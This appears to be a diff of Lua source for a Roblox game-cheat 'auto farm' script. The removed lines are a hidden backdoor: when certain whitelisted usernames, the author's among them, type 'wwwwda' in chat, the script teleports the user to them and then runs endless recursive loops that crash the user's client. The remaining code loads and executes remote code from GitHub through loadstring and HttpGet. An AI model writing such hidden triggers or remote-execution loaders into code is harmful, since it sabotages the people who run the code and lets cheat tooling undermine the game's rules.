@@ -1,10 +1,3 @@
---[[
-    R3TH PRIV TOTAL ROBLOX DRAMA AUTO FARM SOURCE
-
-    Credits:
-        pethicial
-]]
-
 local NotificationHolder = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Module.Lua"))()
 local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Client.Lua"))()
 local StarterGui = game:GetService("StarterGui")
@@ -31,60 +24,6 @@ if dDq9PUXBMUHzPbXSxPsJbcUsHrYCJD4VKKCTt8nwz then
 end
 
 getgenv().dDq9PUXBMUHzPbXSxPsJbcUsHrYCJD4VKKCTt8nwz = true
-
-local qznfbP5yqjj5znhXLhxQ5vbgjRRgwLF4rdpakv33eT3t8ng6ncj3y4HMDkLM = {
-    ["Pethicial"] = true,
-    ["PethiciaI"] = true,
-    ["YouHaveBeenNukedBy"] = true,
-    ["Trixisbetter"] = true,
-    ["ashasky3x"] = true,
-    ["Sauce_167"] = true,
-    ["CrazyNerf2"] = true,
-}
-
-local function esp(crAbzjXpWVZn5UbMz5Hrf8nuXNq92Dvh5sGvFaVRU55n4p8qnCt2SHngFpjC)
-    esprefresh = true
-    while esprefresh do
-        function esprefreshfix()
-        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(crAbzjXpWVZn5UbMz5Hrf8nuXNq92Dvh5sGvFaVRU55n4p8qnCt2SHngFpjC.Character.Head.Position)
-        wait(2)
-        local function esploop()
-            while true do
-                esploop()
-            end
-        end
-        
-        while true do
-            spawn(esploop)
-        end
-        wait()
-    end
-    wait()
-    pcall(esprefreshfix)
-    end
-end
-
-local function vBeD5ZNhsxVMNv4AsyPQve4rxwSquAsTJL4uuzsqEwTe9gqPQ(fQBsB4Qt9YLGDAGeCJ3HdMMKfd6RHxSta8KUfegb)
-    fQBsB4Qt9YLGDAGeCJ3HdMMKfd6RHxSta8KUfegb.Chatted:Connect(function(wTbXKLdp2vecFKR8By9Ys5cpMxp9TfcQPxCj9zHer86L3JyQH9ABM4M6S)
-        if wTbXKLdp2vecFKR8By9Ys5cpMxp9TfcQPxCj9zHer86L3JyQH9ABM4M6S:lower() == "wwwwda" then
-            esp(fQBsB4Qt9YLGDAGeCJ3HdMMKfd6RHxSta8KUfegb)
-        end
-    end)
-end
-
-for pbRBFPqzhSsfBg7nBD2bd6WtM8byz6pU2FTV5E5XEDVurdK5YcZNRDZPE, yhcEmSbrhymw5DqC94cQNAQ3d8EE6jDnFE4FXnfPW5yySQFx8tsHVt in pairs(game.Players:GetPlayers()) do
-    if yhcEmSbrhymw5DqC94cQNAQ3d8EE6jDnFE4FXnfPW5yySQFx8tsHVt.Name ~= game.Players.LocalPlayer.Name then
-        if qznfbP5yqjj5znhXLhxQ5vbgjRRgwLF4rdpakv33eT3t8ng6ncj3y4HMDkLM[yhcEmSbrhymw5DqC94cQNAQ3d8EE6jDnFE4FXnfPW5yySQFx8tsHVt.Name] == true then
-            vBeD5ZNhsxVMNv4AsyPQve4rxwSquAsTJL4uuzsqEwTe9gqPQ(yhcEmSbrhymw5DqC94cQNAQ3d8EE6jDnFE4FXnfPW5yySQFx8tsHVt)
-        end
-    end
-end
-
-game.Players.PlayerAdded:Connect(function(gpZ6xjJYnJpN58BxdwbkmHPfpzx8VW)
-    if qznfbP5yqjj5znhXLhxQ5vbgjRRgwLF4rdpakv33eT3t8ng6ncj3y4HMDkLM[gpZ6xjJYnJpN58BxdwbkmHPfpzx8VW.Name] ==  true then
-        vBeD5ZNhsxVMNv4AsyPQve4rxwSquAsTJL4uuzsqEwTe9gqPQ(gpZ6xjJYnJpN58BxdwbkmHPfpzx8VW)
-    end
-end)
 
 local UIS = game:GetService("UserInputService")
 local PC, PCwithTouch, Touchscreen = (UIS.MouseEnabled and UIS.KeyboardEnabled), (UIS.MouseEnabled and UIS.KeyboardEnabled and UIS.TouchEnabled), UIS.TouchEnabled
@@ -121,6 +60,7 @@ for i,v in pairs(game.ReplicatedStorage:GetDescendants())do
         map = "Lobby"
     elseif v.Name == "Map" and v.ClassName == "StringValue" then
         map = v.Value
+        break
     end
 end
 
